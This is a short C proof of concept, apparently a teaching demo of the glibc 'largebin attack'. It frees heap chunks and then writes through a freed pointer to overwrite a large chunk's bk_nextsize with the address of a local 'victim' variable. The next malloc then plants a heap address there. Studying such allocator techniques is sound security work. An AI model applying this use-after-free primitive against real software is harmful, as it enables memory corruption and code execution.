#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<unistd.h>
static u_int64_t victim=0; 
int main(){
	char *p[3];
	p[0]=malloc(0x458);
	malloc(0x18);
	p[1]=malloc(0x448);
	malloc(0x18);
	free(p[0]);
	malloc(0x600);
	free(p[1]);
	*(u_int64_t *)(p[0]+0x18)=(u_int64_t)&(victim)-0x20;
	malloc(0x68);
}
